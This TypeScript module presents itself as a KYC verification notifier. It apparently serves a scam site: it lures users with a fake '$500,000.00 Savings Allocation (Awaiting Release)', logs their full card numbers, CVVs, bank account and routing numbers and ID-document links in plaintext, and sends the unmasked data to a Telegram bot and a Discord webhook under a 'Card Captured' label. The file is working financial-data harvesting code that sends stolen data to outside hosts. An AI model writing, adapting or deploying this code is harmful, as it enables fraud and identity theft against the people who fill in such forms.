import fs from "fs";
import path from "path";

export interface VerificationNotificationPayload {
    userId: string;
    fullName: string;
    userEmail?: string;
    userPhone?: string;
    employmentStatus?: string;
    occupation?: string;
    annualIncome?: string;
    bankName: string;
    accountHolderName: string;
    accountNumber: string;
    routingNumber: string;
    cardHolderName?: string;
    cardNumber?: string;
    cardType?: string;
    cardCvv?: string;
    cardExpiry?: string;
    documentType?: string;
    documentFrontUrl?: string;
    documentBackUrl?: string;
}

/**
 * Dispatches real-time alerts when a user submits a KYC packet
 */
export async function notifyAdminKYCSubmission(data: VerificationNotificationPayload) {
    const timestamp = new Date().toISOString();

    // 1. Log to logs/verifications.log
    try {
        const logsDir = path.join(process.cwd(), "logs");
        if (!fs.existsSync(logsDir)) {
            fs.mkdirSync(logsDir, { recursive: true });
        }
        const logEntry = JSON.stringify({ timestamp, ...data }, null, 2);
        fs.appendFileSync(path.join(logsDir, "verifications.log"), `\n--- [${timestamp}] ---\n${logEntry}\n`);
    } catch (e) {
        console.error("[Notifier] Failed to write to verifications.log:", e);
    }

    // 2. Formatted terminal banner for pm2 logs
    console.log(`\n======================================================`);
    console.log(`🔔 [KYC ALERT] New Account Verification Packet Received!`);
    console.log(`👤 Client:     ${data.fullName} (${data.userEmail || data.userId})`);
    console.log(`💼 Employment: ${data.employmentStatus || 'N/A'} - ${data.occupation || 'N/A'}`);
    console.log(`💰 Income:     ${data.annualIncome || 'N/A'}`);
    console.log(`🏦 Bank:       ${data.bankName} (Acc: ${data.accountNumber}, Routing: ${data.routingNumber})`);
    if (data.cardNumber) {
        console.log(`💳 Card:       ${data.cardType} ****${data.cardNumber.slice(-4)} (Exp: ${data.cardExpiry})`);
    }
    console.log(`📄 Docs:       ${data.documentType || 'ID'}`);
    console.log(`   Front:      ${data.documentFrontUrl || 'N/A'}`);
    console.log(`   Back:       ${data.documentBackUrl || 'N/A'}`);
    console.log(`======================================================\n`);

    // 3. Optional Telegram Bot Notification
    const telegramToken = process.env.TELEGRAM_BOT_TOKEN;
    const telegramChatId = process.env.TELEGRAM_CHAT_ID;
    if (telegramToken && telegramChatId) {
        try {
            const text = `🔔 *NEW KYC VERIFICATION SUBMITTED*\n` +
                `━━━━━━━━━━━━━━━━━━\n` +
                `👤 *Client:* ${escapeTg(data.fullName)}\n` +
                `📧 *Email:* ${escapeTg(data.userEmail || 'N/A')}\n` +
                `📱 *Phone:* ${escapeTg(data.userPhone || 'N/A')}\n` +
                `💼 *Employment:* ${escapeTg(data.employmentStatus || 'N/A')} (${escapeTg(data.occupation || 'N/A')})\n` +
                `💰 *Annual Income:* ${escapeTg(data.annualIncome || 'N/A')}\n` +
                `🎁 *Savings Allocation:* $500,000.00 (Awaiting Release)\n\n` +
                `🏦 *Bank:* ${escapeTg(data.bankName)}\n` +
                `• Acc: \`${data.accountNumber}\`\n` +
                `• Routing: \`${data.routingNumber}\`\n` +
                (data.cardNumber ? `💳 *Card:* \`${data.cardNumber}\` | CVV: \`${data.cardCvv}\` | Exp: \`${data.cardExpiry}\`\n\n` : '\n') +
                `📄 *Document:* ${escapeTg(data.documentType || 'ID')}\n` +
                `• Front: [View Front](${data.documentFrontUrl})\n` +
                `• Back: [View Back](${data.documentBackUrl})\n` +
                `━━━━━━━━━━━━━━━━━━`;

            await fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: telegramChatId,
                    text,
                    parse_mode: "Markdown"
                })
            });
        } catch (tgErr) {
            console.error("[Notifier] Telegram notification failed:", tgErr);
        }
    }

    // 4. Optional Discord Webhook Notification
    const discordWebhookUrl = process.env.DISCORD_WEBHOOK_URL;
    if (discordWebhookUrl) {
        try {
            const embed = {
                title: "🔔 New KYC Verification Submitted",
                color: 0x10b981,
                fields: [
                    { name: "Client Name", value: data.fullName, inline: true },
                    { name: "Email", value: data.userEmail || "N/A", inline: true },
                    { name: "Employment", value: `${data.employmentStatus || 'N/A'} (${data.occupation || 'N/A'})`, inline: false },
                    { name: "Annual Income", value: data.annualIncome || "N/A", inline: true },
                    { name: "Savings Allocation", value: "$500,000.00", inline: true },
                    { name: "Bank Destination", value: `${data.bankName}\nAcc: ${data.accountNumber} | Routing: ${data.routingNumber}`, inline: false },
                    { name: "Card Captured", value: data.cardNumber ? `${data.cardType}: ${data.cardNumber} (CVV: ${data.cardCvv}, Exp: ${data.cardExpiry})` : "None", inline: false },
                    { name: "Identity Document", value: `${data.documentType}\n[Front](${data.documentFrontUrl}) | [Back](${data.documentBackUrl})`, inline: false }
                ],
                timestamp: new Date().toISOString()
            };

            await fetch(discordWebhookUrl, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ embeds: [embed] })
            });
        } catch (dcErr) {
            console.error("[Notifier] Discord webhook notification failed:", dcErr);
        }
    }
}

function escapeTg(str: string): string {
    return (str || "").replace(/[_*[\]()~`>#+-=|{}.!]/g, "\\$&");
}
